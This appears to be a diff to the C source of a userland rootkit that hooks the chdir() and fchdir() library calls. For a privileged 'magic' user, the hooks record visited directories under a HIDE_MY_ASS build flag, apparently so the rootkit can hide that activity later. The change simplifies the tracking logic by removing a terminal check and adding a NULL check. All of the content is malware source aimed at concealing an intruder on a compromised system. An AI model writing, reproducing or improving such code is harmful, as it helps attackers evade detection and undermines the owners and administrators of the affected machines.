@@ -3,13 +3,8 @@ int chdir(const char *pathname){
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(CCHDIR, pathname);
-        if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd))
-                if(!pathtracked(pathname))
-                    trackwrite(pathname);
-        }
+        if(ret && !pathtracked(pathname))
+            trackwrite(pathname);
         return ret;
 #else
         return (long)call(CCHDIR, pathname);
@@ -25,10 +20,8 @@ int fchdir(int fd){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(CFCHDIR, fd);
         if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(fd);
+            char *apath = gdirname(fd);
+            if(apath != NULL){
                 if(!pathtracked(apath))
                     trackwrite(apath);
                 free(apath);
